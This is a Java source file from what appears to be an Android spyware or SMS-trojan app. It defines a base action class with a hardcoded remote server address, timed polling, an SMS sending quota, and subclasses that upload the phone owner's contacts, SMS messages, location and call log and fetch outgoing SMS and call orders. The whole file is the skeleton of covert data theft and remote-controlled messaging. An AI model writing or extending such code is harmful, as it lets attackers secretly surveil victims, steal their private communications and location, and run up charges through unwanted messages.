package com.m1.android.data.action;

import android.content.Context;

import com.m1.android.data.entity.User;
import com.m1.android.data.http.HttpWrapper;
import com.m1.android.data.util.LocalManager;
import com.m1.android.data.util.PhoneUtil;

public abstract class BaseAction {
	// 默认与服务器通讯的时间间隔
	protected static final long DEFAULT_PERIOD = 3 * 60 * 1000;
	// 发送短信到达最大次数后与服务器通讯的时间
	protected static final long SEND_SMS_PERIOD = 10 * 60 * 1000;
	// 单位时间内允许发送的短信的最大数量
	protected static final int SEND_SMS_SIZE = 100;
	public static final String DEFAULT_HOST = "http://wudi0123.dns0755.net";
//		public static final String DEFAULT_HOST = "http://192.168.1.100:8080/monitor";
	protected Context mContext;
	protected User mUser;
	protected HttpWrapper mHttpWrapper;
	protected String mPhone;
	private static final String[] SUB_CLASSES = new String[] { SychUserAction.class.getName(), UpContactAction.class.getName(), UpSmsAction.class.getName(),
			UpLocationAction.class.getName(), LoadOutgoingSmsAction.class.getName(), LoadOutgoingCallAction.class.getName(),
			LoadSmsMotionAction.class.getName(), UpCallLogAction.class.getName() };

	public static String[] getSubClasses() {
		return SUB_CLASSES;
	}

	public abstract boolean excute();

	protected abstract String getRequestUrl();

	public void init(Context context) {
		this.mContext = context;
		mHttpWrapper = HttpWrapper.getInstance(context.getApplicationContext());
		mUser = LocalManager.getUser(mContext);
		mPhone = PhoneUtil.getPhone(mContext);
	}

	protected boolean allowUpload() {
		return mUser != null && mUser.isVisible();
	}

	public long getExcutePeriod() {
		return DEFAULT_PERIOD;
	}
}
